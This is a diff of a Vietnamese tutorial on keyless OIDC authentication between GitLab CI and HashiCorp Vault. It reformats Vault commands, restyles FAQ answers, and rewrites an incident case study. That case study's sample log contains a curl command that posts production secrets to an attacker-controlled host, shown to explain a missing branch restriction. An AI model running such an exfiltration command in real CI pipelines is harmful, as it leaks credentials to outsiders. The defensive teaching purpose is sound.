@@ -47,7 +47,7 @@ Cách làm này tiềm ẩn 4 tử huyệt an ninh nghiêm trọng:
 
 > **Chuẩn mực an ninh cấp ngân hàng và doanh nghiệp hiện đại bắt buộc phải chuyển sang mô hình "Keyless OIDC Authentication" kết hợp với "Dynamic Secrets": GitLab CI không lưu trữ bất kỳ mật khẩu nào; thay vào đó, mỗi Job CI sẽ được cấp một JSON Web Token (JWT) có chữ ký mật mã, dùng để đổi lấy Token ngắn hạn (Short-lived Dynamic Token) từ HashiCorp Vault chỉ có hiệu lực trong vài phút.**
 
-```
+```text
        QUY TRÌNH XÁC THỰC KHÔNG KHÓA OIDC GIỮA GITLAB CI VÀ HASHICORP VAULT
 
   [ GitLab CI Runner ] ── 1. Sinh JWT Token (id_tokens) ──► [ GitLab OIDC Identity Provider ]
@@ -129,7 +129,9 @@ GitLab CI hỗ trợ cú pháp `secrets:` tích hợp trực tiếp ở tầng R
 vault auth enable jwt
 
 # 2. Cấu hình OIDC Discovery trỏ tới GitLab
-vault write auth/jwt/config     oidc_discovery_url="https://gitlab.corp.internal"     bound_issuer="https://gitlab.corp.internal"
+vault write auth/jwt/config \
+    oidc_discovery_url="https://gitlab.corp.internal" \
+    bound_issuer="https://gitlab.corp.internal"
 
 # 3. Tạo Policy cho phép đọc Secret Production
 vault policy write production-app-policy - <<EOF
@@ -139,11 +141,18 @@ path "secret/data/production/database" {
 EOF
 
 # 4. Tạo Vault Role liên kết với Project GitLab và Nhánh main
-vault write auth/jwt/role/gitlab-production-role     role_type="jwt"     policies="production-app-policy"     token_ttl="15m"     token_max_ttl="30m"     bound_claims_type="glob"     bound_claims='{
+vault write auth/jwt/role/gitlab-production-role \
+    role_type="jwt" \
+    policies="production-app-policy" \
+    token_ttl="15m" \
+    token_max_ttl="30m" \
+    bound_claims_type="glob" \
+    bound_claims='{
       "project_id": "42",
       "ref": "main",
       "ref_protected": "true"
-    }'     user_claim="user_login"
+    }' \
+    user_claim="user_login"
 ```
 
 ### 3.2. Cấu Hình Pipeline `.gitlab-ci.yml` Sử Dụng Native `secrets:`
@@ -185,33 +194,33 @@ deploy_to_production:
 
 ## 4. Phân Tích Cạm Bẫy Thực Chiến (5-Whys Incident Analysis)
 
-### 4.1. Sự Cố Thực Tế: Nhánh Tính Năng (Feature Branch) Đọc Trộm Secret Của Production
+### Tình Huống Sự Cố Thực Tế:
+<span class="badge badge--rose">🕒 03:30 PM</span> Một kỹ sư thực tập tạo nhánh `feature/update-readme` và thêm lệnh `curl` trong `.gitlab-ci.yml` để gửi toàn bộ biến môi trường của Job về máy chủ cá nhân. Do cấu hình Vault Role không ràng buộc nhánh (`bound_claims` lỏng lẻo), job trên nhánh feature đã lấy thành công JWT Token, đăng nhập vào Vault và đánh cắp toàn bộ Secret của Production Database.
 
-> **Bối Cảnh**: Một kỹ sư thực tập tạo nhánh `feature/update-readme` và thêm lệnh `curl` trong `.gitlab-ci.yml` để gửi toàn bộ biến môi trường của Job về máy chủ cá nhân. Do cấu hình Vault Role không ràng buộc nhánh (`bound_claims` lỏng lẻo), job trên nhánh feature đã lấy thành công JWT Token, đăng nhập vào Vault và đánh cắp toàn bộ Secret của Production Database.
+### Hậu Quả & Log Lỗi Thực Tế:
+Dữ liệu Production Database bị trích xuất trái phép ra máy chủ bên ngoài thông qua pipeline CI của nhánh tính năng:
 
-```
-┌─────────────────────────────────────────────────────────────────────────┐
-│                    PHÂN TÍCH NGUYÊN NHÂN GỐC RỄ (5-WHYS)                 │
-├─────────────────────────────────────────────────────────────────────────┤
-│ 1. Tại sao Secret Production Database bị đánh cắp từ nhánh feature?     │
-│    -> Job trên nhánh feature đã đổi thành công Vault Token Production.  │
-│                                                                         │
-│ 2. Tại sao Vault lại cấp quyền Production cho nhánh feature?            │
-│    -> Vault Role chỉ kiểm tra Claim project_id mà bỏ qua Claim ref.     │
-│                                                                         │
-│ 3. Tại sao cấu hình Vault Role lại bỏ qua Claim ref?                    │
-│    -> Kỹ sư thiết lập muốn dùng chung một Role cho toàn bộ dự án.       │
-│                                                                         │
-│ 4. Tại sao không có sự tách biệt Role giữa Development và Production?   │
-│    -> Thiếu chính sách kiểm soát truy cập phân tầng (Role Separation).  │
-│                                                                         │
-│ 5. NGUYÊN NHÂN CỐT LÕI (Root Cause):                                   │
-│    -> Cấu hình Vault Role thiếu điều kiện ràng buộc bắt buộc            │
-│       "ref": "main" và "ref_protected": "true" trong bound_claims.      │
-└─────────────────────────────────────────────────────────────────────────┘
+```text
+[gitlab-runner] › ⚡  Executing job 'test_docs' on branch 'feature/update-readme'
+[gitlab-runner] › ℹ  Requesting Vault JWT Token with Audience 'https://vault.corp.internal'
+[vault-audit]   › ⚡  AUTH SUCCESS: Role 'app-read-role' issued token for sub: project_path:corp/backend:ref:feature/update-readme
+[test-job]      › ℹ  Reading secret 'secret/data/production/database'
+[test-job]      › ⚡  curl -X POST -d @secret.json https://attacker-controlled-server.com/exfiltrate
+[security-team] › ❌  CRITICAL DATA EXFILTRATION DETECTED: Production DB Master Password leaked via Feature Branch CI!
 ```
 
-### 4.2. Giải Pháp Khắc Phục Triệt Để
+### 5-Whys Root Cause Analysis:
+1. <span class="badge badge--primary">Why 1</span> Tại sao Secret Production Database bị đánh cắp từ một nhánh feature vô hại?  
+   &rarr; Do Job CI trên nhánh feature đã đổi thành công Token JWT lấy quyền truy cập bí mật Production của Vault.
+2. <span class="badge badge--primary">Why 2</span> Tại sao Vault lại chấp thuận cấp quyền Production cho một nhánh feature chưa kiểm duyệt?  
+   &rarr; Do cấu hình Vault Role chỉ kiểm tra `project_id` mà bỏ qua điều kiện ràng buộc nhánh `ref`.
+3. <span class="badge badge--primary">Why 3</span> Tại sao cấu hình Vault Role lại bỏ qua Claim `ref`?  
+   &rarr; Do kỹ sư thiết lập muốn dùng chung một Role duy nhất cho toàn bộ các nhánh trong dự án để tiện cấu hình.
+4. <span class="badge badge--primary">Why 4</span> Tại sao không có sự tách biệt Role rõ ràng giữa Development, Staging và Production?  
+   &rarr; Do thiếu chính sách kiểm soát truy cập phân tầng (Role & Environment Separation Policy).
+5. <span class="badge badge--emerald">Root Cause Remedy</span> Cấu hình Vault Role thiếu điều kiện ràng buộc bắt buộc `"ref": "main"` và `"ref_protected": "true"` trong `bound_claims`, cho phép bất kỳ nhánh không an toàn nào cũng có thể giả mạo danh tính để đọc mật khẩu môi trường Production.
+
+### Giải Pháp Khắc Phục Triệt Để:
 
 1. **Ràng buộc chặt chẽ Claims trong mọi Vault Role**:
    - Role Production: Bắt buộc `bound_claims: { "ref": "main", "ref_protected": "true" }`.
@@ -229,7 +238,7 @@ deploy_to_production:
 - Thiết lập Policy và Secret Key-Value (KV v2).
 - Viết Pipeline GitLab CI xác thực bằng JWT `id_tokens` và lấy Secret thành công.
 
-```
+```text
        QUY TRÌNH THỰC HÀNH LAB OIDC FEDERATION VỚI HASHICORP VAULT
 
      [ GitLab CI Job ]
@@ -270,13 +279,17 @@ export VAULT_TOKEN='root-token-lab'
 vault auth enable jwt
 
 # Cấu hình Issuer URL của GitLab
-vault write auth/jwt/config     oidc_discovery_url="https://gitlab.corp.internal"     bound_issuer="https://gitlab.corp.internal"
+vault write auth/jwt/config \
+    oidc_discovery_url="https://gitlab.corp.internal" \
+    bound_issuer="https://gitlab.corp.internal"
 ```
 
 #### Bước 4: Tạo Secret Mẫu Trong Vault KV Engine v2
 ```bash
 # Tạo Secret chứa Database URL và API Key
-vault kv put secret/production/payment-service     DB_CONNECTION_STRING="postgresql://app_user:SuperSecurePass99@db.internal:5432/payment_db"     STRIPE_SECRET_KEY="sk_live_998877665544332211"
+vault kv put secret/production/payment-service \
+    DB_CONNECTION_STRING="postgresql://app_user:SuperSecurePass99@db.internal:5432/payment_db" \
+    STRIPE_SECRET_KEY="sk_live_998877665544332211"
 ```
 
 #### Bước 5: Tạo Vault Policy Cho Phép Đọc Quyền Tối Thiểu
@@ -293,10 +306,16 @@ vault policy write payment-production-policy payment-policy.hcl
 
 #### Bước 6: Định Nghĩa Vault JWT Role Với Bound Claims An Toàn
 ```bash
-vault write auth/jwt/role/payment-prod-role     role_type="jwt"     policies="payment-production-policy"     token_ttl="10m"     bound_claims_type="glob"     bound_claims='{
+vault write auth/jwt/role/payment-prod-role \
+    role_type="jwt" \
+    policies="payment-production-policy" \
+    token_ttl="10m" \
+    bound_claims_type="glob" \
+    bound_claims='{
       "project_path": "fintech/payment-service",
       "ref": "main"
-    }'     user_claim="user_login"
+    }' \
+    user_claim="user_login"
 ```
 
 #### Bước 7: Cấu Hình Tệp `.gitlab-ci.yml` Lấy Secret Tự Động
@@ -334,7 +353,7 @@ retrieve_vault_secrets:
 #### Bước 8: Commit Code Và Quan Sát Quá Trình Xác Thực Thành Công
 - Đẩy commit lên branch `main`.
 - Xem log job `retrieve_vault_secrets`:
-  ```bash
+  ```text
   $ export VAULT_TOKEN=$(vault write -field=token auth/jwt/login role="payment-prod-role" jwt="${VAULT_AUTH_JWT}")
   $ vault kv get -format=json secret/production/payment-service > secret.json
   Retrieved Secret successfully! Token will auto-expire in 10 minutes.
@@ -353,12 +372,18 @@ retrieve_vault_secrets:
     <span>Tại sao xác thực OIDC Federation lại an toàn hơn đáng kể so với việc lưu Token cố định trong GitLab Variables?</span>
   </summary>
   <div class="qa-body">
-    <p><strong>Ưu điểm bảo mật:</strong></p>
-    <ul>
-      <li><strong>Không tồn tại bí mật tĩnh (No Static Credentials)</strong>: Không có mật khẩu hay token nào được lưu trong cơ sở dữ liệu của GitLab. Do đó, nếu kẻ xấu dump database GitLab cũng không lấy được thông tin đăng nhập.</li>
-      <li><strong>Thời hạn ngắn (Short-lived)</strong>: Token được sinh ra lúc job bắt đầu và tự hủy sau khi job xong (hoặc tối đa 15 phút).</li>
-      <li><strong>Ràng buộc ngữ cảnh (Contextual Authorization)</strong>: Token chỉ hợp lệ khi chạy đúng project ID, đúng commit branch và đúng người kích hoạt.</li>
-    </ul>
+    <div class="qa-answer">
+      <div class="qa-answer-header">
+        <svg class="qa-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>
+        <span>Phân Tích &amp; Lời Giải Kỹ Thuật</span>
+      </div>
+      <p><strong>Ưu điểm bảo mật:</strong></p>
+      <ul>
+        <li><strong>Không tồn tại bí mật tĩnh (No Static Credentials)</strong>: Không có mật khẩu hay token nào được lưu trong cơ sở dữ liệu của GitLab. Do đó, nếu kẻ xấu dump database GitLab cũng không lấy được thông tin đăng nhập.</li>
+        <li><strong>Thời hạn ngắn (Short-lived)</strong>: Token được sinh ra lúc job bắt đầu và tự hủy sau khi job xong (hoặc tối đa 15 phút).</li>
+        <li><strong>Ràng buộc ngữ cảnh (Contextual Authorization)</strong>: Token chỉ hợp lệ khi chạy đúng project ID, đúng commit branch và đúng người kích hoạt.</li>
+      </ul>
+    </div>
   </div>
 </details>
 
@@ -368,8 +393,14 @@ retrieve_vault_secrets:
     <span>Trường `aud` (Audience) trong cấu hình `id_tokens` của GitLab CI có vai trò gì?</span>
   </summary>
   <div class="qa-body">
-    <p><strong>Mục đích:</strong></p>
-    <p><code>aud</code> chỉ định đối tượng người nhận dự kiến của JWT (thường là URL của Vault hoặc AWS STS). Khi Vault nhận được token, nó sẽ kiểm tra xem giá trị <code>aud</code> trong token có khớp với cấu hình của nó hay không. Điều này ngăn chặn cuộc tấn công <strong>Token Substitution (Replay Attack)</strong> — ngăn kẻ tấn công lấy JWT được cấp cho dịch vụ A đem đi đăng nhập vào dịch vụ B.</p>
+    <div class="qa-answer">
+      <div class="qa-answer-header">
+        <svg class="qa-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>
+        <span>Phân Tích &amp; Lời Giải Kỹ Thuật</span>
+      </div>
+      <p><strong>Mục đích:</strong></p>
+      <p><code>aud</code> chỉ định đối tượng người nhận dự kiến của JWT (thường là URL của Vault hoặc AWS STS). Khi Vault nhận được token, nó sẽ kiểm tra xem giá trị <code>aud</code> trong token có khớp với cấu hình của nó hay không. Điều này ngăn chặn cuộc tấn công <strong>Token Substitution (Replay Attack)</strong> — ngăn kẻ tấn công lấy JWT được cấp cho dịch vụ A đem đi đăng nhập vào dịch vụ B.</p>
+    </div>
   </div>
 </details>
 
@@ -379,8 +410,14 @@ retrieve_vault_secrets:
     <span>Cơ chế "Dynamic Database Secrets" trong HashiCorp Vault hoạt động như thế nào?</span>
   </summary>
   <div class="qa-body">
-    <p><strong>Nguyên lý:</strong></p>
-    <p>Thay vì đọc một tài khoản Database cố định, Vault Database Secrets Engine sẽ <strong>tạo mới một User và Password ngẫu nhiên trực tiếp trong Database</strong> (ví dụ: <code>v-token-job-12345</code>) khi có yêu cầu từ CI. User này chỉ có quyền đúng trong phạm vi cần thiết và có thời hạn sống (Lease TTL, ví dụ: 15 phút). Hết thời gian này, Vault sẽ tự động phát lệnh <code>DROP USER</code> trên database.</p>
+    <div class="qa-answer">
+      <div class="qa-answer-header">
+        <svg class="qa-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>
+        <span>Phân Tích &amp; Lời Giải Kỹ Thuật</span>
+      </div>
+      <p><strong>Nguyên lý:</strong></p>
+      <p>Thay vì đọc một tài khoản Database cố định, Vault Database Secrets Engine sẽ <strong>tạo mới một User và Password ngẫu nhiên trực tiếp trong Database</strong> (ví dụ: <code>v-token-job-12345</code>) khi có yêu cầu từ CI. User này chỉ có quyền đúng trong phạm vi cần thiết và có thời hạn sống (Lease TTL, ví dụ: 15 phút). Hết thời gian này, Vault sẽ tự động phát lệnh <code>DROP USER</code> trên database.</p>
+    </div>
   </div>
 </details>
 
@@ -390,11 +427,17 @@ retrieve_vault_secrets:
     <span>Làm thế nào để truyền Secret từ Vault vào ứng dụng mà không bao giờ ghi ra tệp tin trên ổ cứng runner?</span>
   </summary>
   <div class="qa-body">
-    <p><strong>Giải pháp:</strong></p>
-    <ul>
-      <li>Sử dụng tính năng <code>secrets: file: false</code> trong GitLab CI để nạp thẳng secret vào biến môi trường trong bộ nhớ RAM.</li>
-      <li>Sử dụng công cụ <strong>Vault Agent / Envconsul</strong> để khởi chạy ứng dụng trực tiếp kèm biến môi trường: <code>envconsul -pristine -prefix secret/data/app ./server</code> mà không tạo file trung gian.</li>
-    </ul>
+    <div class="qa-answer">
+      <div class="qa-answer-header">
+        <svg class="qa-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>
+        <span>Phân Tích &amp; Lời Giải Kỹ Thuật</span>
+      </div>
+      <p><strong>Giải pháp:</strong></p>
+      <ul>
+        <li>Sử dụng tính năng <code>secrets: file: false</code> trong GitLab CI để nạp thẳng secret vào biến môi trường trong bộ nhớ RAM.</li>
+        <li>Sử dụng công cụ <strong>Vault Agent / Envconsul</strong> để khởi chạy ứng dụng trực tiếp kèm biến môi trường: <code>envconsul -pristine -prefix secret/data/app ./server</code> mà không tạo file trung gian.</li>
+      </ul>
+    </div>
   </div>
 </details>
 
@@ -404,11 +447,17 @@ retrieve_vault_secrets:
     <span>Sự khác biệt giữa HashiCorp Vault KV Engine phiên bản 1 (v1) và phiên bản 2 (v2) là gì?</span>
   </summary>
   <div class="qa-body">
-    <p><strong>So sánh:</strong></p>
-    <ul>
-      <li><strong>KV v1</strong>: Chỉ lưu trữ giá trị hiện tại đơn giản. Không có lịch sử phiên bản, thao tác xóa sẽ làm mất vĩnh viễn dữ liệu.</li>
-      <li><strong>KV v2</strong>: Hỗ trợ đánh số phiên bản tự động (Versioning), cho phép xem lại các bản secret cũ (Rollback), hỗ trợ phục hồi dữ liệu sau khi xóa mềm (Soft Delete) và có cấu trúc đường dẫn API chứa tiền tố <code>/data/</code> (ví dụ: <code>secret/data/...</code>).</li>
-    </ul>
+    <div class="qa-answer">
+      <div class="qa-answer-header">
+        <svg class="qa-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>
+        <span>Phân Tích &amp; Lời Giải Kỹ Thuật</span>
+      </div>
+      <p><strong>So sánh:</strong></p>
+      <ul>
+        <li><strong>KV v1</strong>: Chỉ lưu trữ giá trị hiện tại đơn giản. Không có lịch sử phiên bản, thao tác xóa sẽ làm mất vĩnh viễn dữ liệu.</li>
+        <li><strong>KV v2</strong>: Hỗ trợ đánh số phiên bản tự động (Versioning), cho phép xem lại các bản secret cũ (Rollback), hỗ trợ phục hồi dữ liệu sau khi xóa mềm (Soft Delete) và có cấu trúc đường dẫn API chứa tiền tố <code>/data/</code> (ví dụ: <code>secret/data/...</code>).</li>
+      </ul>
+    </div>
   </div>
 </details>
 
@@ -418,8 +467,14 @@ retrieve_vault_secrets:
     <span>Làm sao để cấu hình Vault AppRole thay vì OIDC khi chạy các tác vụ hạ tầng ngoài GitLab?</span>
   </summary>
   <div class="qa-body">
-    <p><strong>Phương thức AppRole:</strong></p>
-    <p>Vault AppRole sử dụng cặp thông tin <code>RoleID</code> (tương đương Username) và <code>SecretID</code> (tương đương Password có thời hạn). Thường dùng cho các ứng dụng chạy trên VM cố định hoặc máy chủ Bare-metal không có OIDC Identity Provider.</p>
+    <div class="qa-answer">
+      <div class="qa-answer-header">
+        <svg class="qa-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>
+        <span>Phân Tích &amp; Lời Giải Kỹ Thuật</span>
+      </div>
+      <p><strong>Phương thức AppRole:</strong></p>
+      <p>Vault AppRole sử dụng cặp thông tin <code>RoleID</code> (tương đương Username) và <code>SecretID</code> (tương đương Password có thời hạn). Thường dùng cho các ứng dụng chạy trên VM cố định hoặc máy chủ Bare-metal không có OIDC Identity Provider.</p>
+    </div>
   </div>
 </details>
 
@@ -429,8 +484,14 @@ retrieve_vault_secrets:
     <span>Tại sao cần bật cờ `ref_protected: "true"` trong Bound Claims của Vault cho môi trường Production?</span>
   </summary>
   <div class="qa-body">
-    <p><strong>Bảo vệ an ninh:</strong></p>
-    <p>Bất kỳ lập trình viên nào có quyền tạo branch cũng có thể đặt tên nhánh là <code>main-patch</code> hoặc <code>release</code>. Cờ <code>ref_protected: "true"</code> do GitLab cấp trong JWT đảm bảo rằng commit đó đang thực sự chạy trên một nhánh được áp dụng chính sách <strong>Protected Branch</strong> (chỉ Maintainer mới có quyền merge sau khi qua Code Review), ngăn chặn việc developer tự tạo branch rác để lấy trộm secret.</p>
+    <div class="qa-answer">
+      <div class="qa-answer-header">
+        <svg class="qa-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>
+        <span>Phân Tích &amp; Lời Giải Kỹ Thuật</span>
+      </div>
+      <p><strong>Bảo vệ an ninh:</strong></p>
+      <p>Bất kỳ lập trình viên nào có quyền tạo branch cũng có thể đặt tên nhánh là <code>main-patch</code> hoặc <code>release</code>. Cờ <code>ref_protected: "true"</code> do GitLab cấp trong JWT đảm bảo rằng commit đó đang thực sự chạy trên một nhánh được áp dụng chính sách <strong>Protected Branch</strong> (chỉ Maintainer mới có quyền merge sau khi qua Code Review), ngăn chặn việc developer tự tạo branch rác để lấy trộm secret.</p>
+    </div>
   </div>
 </details>
 
@@ -440,8 +501,14 @@ retrieve_vault_secrets:
     <span>Làm thế nào để xoay vòng khóa Root CA hoặc Token Signing Key của GitLab OIDC mà không làm sập CI?</span>
   </summary>
   <div class="qa-body">
-    <p><strong>Cơ chế JWKS:</strong></p>
-    <p>GitLab cung cấp endpoint <strong>JSON Web Key Set (JWKS)</strong> tại đường dẫn <code>https://gitlab.corp.internal/oauth/discovery/keys</code>. Khi GitLab xoay vòng khóa ký JWT, Vault sẽ tự động tải các Public Keys mới từ endpoint này để xác thực chữ ký mà không cần khởi động lại server hay cập nhật cấu hình thủ công.</p>
+    <div class="qa-answer">
+      <div class="qa-answer-header">
+        <svg class="qa-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>
+        <span>Phân Tích &amp; Lời Giải Kỹ Thuật</span>
+      </div>
+      <p><strong>Cơ chế JWKS:</strong></p>
+      <p>GitLab cung cấp endpoint <strong>JSON Web Key Set (JWKS)</strong> tại đường dẫn <code>https://gitlab.corp.internal/oauth/discovery/keys</code>. Khi GitLab xoay vòng khóa ký JWT, Vault sẽ tự động tải các Public Keys mới từ endpoint này để xác thực chữ ký mà không cần khởi động lại server hay cập nhật cấu hình thủ công.</p>
+    </div>
   </div>
 </details>
 
@@ -451,11 +518,17 @@ retrieve_vault_secrets:
     <span>Sự cố: Job CI báo lỗi `permission denied` khi gọi Vault API dù JWT Token hợp lệ. Tìm nguyên nhân thế nào?</span>
   </summary>
   <div class="qa-body">
-    <p><strong>Các bước kiểm tra:</strong></p>
-    <ol>
-      <li>Kiểm tra Vault Policy gắn với Role xem đã cấp đúng quyền <code>capabilities = ["read"]</code> cho đường dẫn chính xác (đặc biệt lưu ý tiền tố <code>/data/</code> nếu dùng KV v2).</li>
-      <li>Kiểm tra Vault Audit Log (<code>/var/log/vault/audit.log</code>) để xem chính xác mã lỗi và Claim nào bị từ chối.</li>
-    </ol>
+    <div class="qa-answer">
+      <div class="qa-answer-header">
+        <svg class="qa-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>
+        <span>Phân Tích &amp; Lời Giải Kỹ Thuật</span>
+      </div>
+      <p><strong>Các bước kiểm tra:</strong></p>
+      <ol>
+        <li>Kiểm tra Vault Policy gắn với Role xem đã cấp đúng quyền <code>capabilities = ["read"]</code> cho đường dẫn chính xác (đặc biệt lưu ý tiền tố <code>/data/</code> nếu dùng KV v2).</li>
+        <li>Kiểm tra Vault Audit Log (<code>/var/log/vault/audit.log</code>) để xem chính xác mã lỗi và Claim nào bị từ chối.</li>
+      </ol>
+    </div>
   </div>
 </details>
 
@@ -465,8 +538,14 @@ retrieve_vault_secrets:
     <span>Làm thế nào để tích hợp HashiCorp Vault với AWS để sinh IAM STS Credentials động cho Runner?</span>
   </summary>
   <div class="qa-body">
-    <p><strong>Cơ chế Vault AWS Secrets Engine:</strong></p>
-    <p>Kích hoạt <code>vault secrets enable aws</code>. Cấu hình Vault liên kết với một IAM Role trong AWS. Khi GitLab CI yêu cầu, Vault sẽ gọi <code>sts:AssumeRole</code> để sinh ra cặp <code>AWS_ACCESS_KEY_ID</code>, <code>AWS_SECRET_ACCESS_KEY</code> và <code>AWS_SESSION_TOKEN</code> tạm thời có hiệu lực 15 phút cho Runner thực hiện deploy Terraform/S3.</p>
+    <div class="qa-answer">
+      <div class="qa-answer-header">
+        <svg class="qa-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>
+        <span>Phân Tích &amp; Lời Giải Kỹ Thuật</span>
+      </div>
+      <p><strong>Cơ chế Vault AWS Secrets Engine:</strong></p>
+      <p>Kích hoạt <code>vault secrets enable aws</code>. Cấu hình Vault liên kết với một IAM Role trong AWS. Khi GitLab CI yêu cầu, Vault sẽ gọi <code>sts:AssumeRole</code> để sinh ra cặp <code>AWS_ACCESS_KEY_ID</code>, <code>AWS_SECRET_ACCESS_KEY</code> và <code>AWS_SESSION_TOKEN</code> tạm thời có hiệu lực 15 phút cho Runner thực hiện deploy Terraform/S3.</p>
+    </div>
   </div>
 </details>
 
@@ -476,11 +555,17 @@ retrieve_vault_secrets:
     <span>Làm sao để ngăn chặn việc Secret bị ghi vào tệp Artifacts hoặc Cache của GitLab CI?</span>
   </summary>
   <div class="qa-body">
-    <p><strong>Quy tắc an toàn:</strong></p>
-    <ul>
-      <li>Không lưu trữ file secret trong thư mục làm việc của dự án nếu thư mục đó nằm trong danh sách <code>artifacts:paths</code> hoặc <code>cache:paths</code>.</li>
-      <li>Luôn chạy lệnh <code>rm -f secret.json</code> ở khối <code>after_script</code> hoặc sử dụng RAM disk (<code>/dev/shm</code>) để chứa tệp bí mật tạm thời.</li>
-    </ul>
+    <div class="qa-answer">
+      <div class="qa-answer-header">
+        <svg class="qa-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>
+        <span>Phân Tích &amp; Lời Giải Kỹ Thuật</span>
+      </div>
+      <p><strong>Quy tắc an toàn:</strong></p>
+      <ul>
+        <li>Không lưu trữ file secret trong thư mục làm việc của dự án nếu thư mục đó nằm trong danh sách <code>artifacts:paths</code> hoặc <code>cache:paths</code>.</li>
+        <li>Luôn chạy lệnh <code>rm -f secret.json</code> ở khối <code>after_script</code> hoặc sử dụng RAM disk (<code>/dev/shm</code>) để chứa tệp bí mật tạm thời.</li>
+      </ul>
+    </div>
   </div>
 </details>
 
@@ -490,8 +575,14 @@ retrieve_vault_secrets:
     <span>Làm cách nào để triển khai cụm HashiCorp Vault High Availability (HA) phục vụ hàng ngàn Runners đồng thời?</span>
   </summary>
   <div class="qa-body">
-    <p><strong>Kiến trúc HA:</strong></p>
-    <p>Triển khai cụm Vault gồm tối thiểu 3 đến 5 nodes sử dụng <strong>Raft Integrated Storage</strong> hoặc <strong>Consul Storage Backend</strong>. Sử dụng một Bộ cân bằng tải (Load Balancer - NLB/HAProxy) đặt phía trước để định tuyến lưu lượng vào Active Node và phân tải các truy vấn đọc (Read Replicas / Performance Standby Nodes).</p>
+    <div class="qa-answer">
+      <div class="qa-answer-header">
+        <svg class="qa-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>
+        <span>Phân Tích &amp; Lời Giải Kỹ Thuật</span>
+      </div>
+      <p><strong>Kiến trúc HA:</strong></p>
+      <p>Triển khai cụm Vault gồm tối thiểu 3 đến 5 nodes sử dụng <strong>Raft Integrated Storage</strong> hoặc <strong>Consul Storage Backend</strong>. Sử dụng một Bộ cân bằng tải (Load Balancer - NLB/HAProxy) đặt phía trước để định tuyến lưu lượng vào Active Node và phân tải các truy vấn đọc (Read Replicas / Performance Standby Nodes).</p>
+    </div>
   </div>
 </details>
 
@@ -507,7 +598,7 @@ retrieve_vault_secrets:
 
 ### 7.2. Sơ Đồ Tư Duy Hệ Thống Quản Lý Bí Mật OIDC & Vault (Mindmap)
 
-```
+```text
                      QUẢN TRỊ BÍ MẬT KHÔNG KHÓA (OIDC & VAULT)
                                         │
         ┌───────────────────────────────┼───────────────────────────────┐
